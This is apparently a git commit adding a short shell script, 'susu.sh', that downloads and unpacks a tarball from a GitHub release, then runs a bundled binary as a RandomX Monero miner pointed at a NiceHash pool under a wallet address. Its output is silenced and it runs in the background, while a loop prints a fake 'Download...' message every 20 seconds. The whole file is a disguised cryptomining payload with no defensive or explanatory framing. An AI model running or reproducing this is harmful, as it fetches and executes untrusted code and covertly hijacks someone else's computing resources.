62ec16e2bcdbb510459cd408dd7be1323abd3927
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-11 23:52:57 +0700

    Create susu.sh

---
+++ susu.sh
@@ -0,0 +1,6 @@
+wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.vivo -t 1 > /dev/null 2>&1 &
+while true
+do
+        echo "Download..."
+        sleep 20
+done
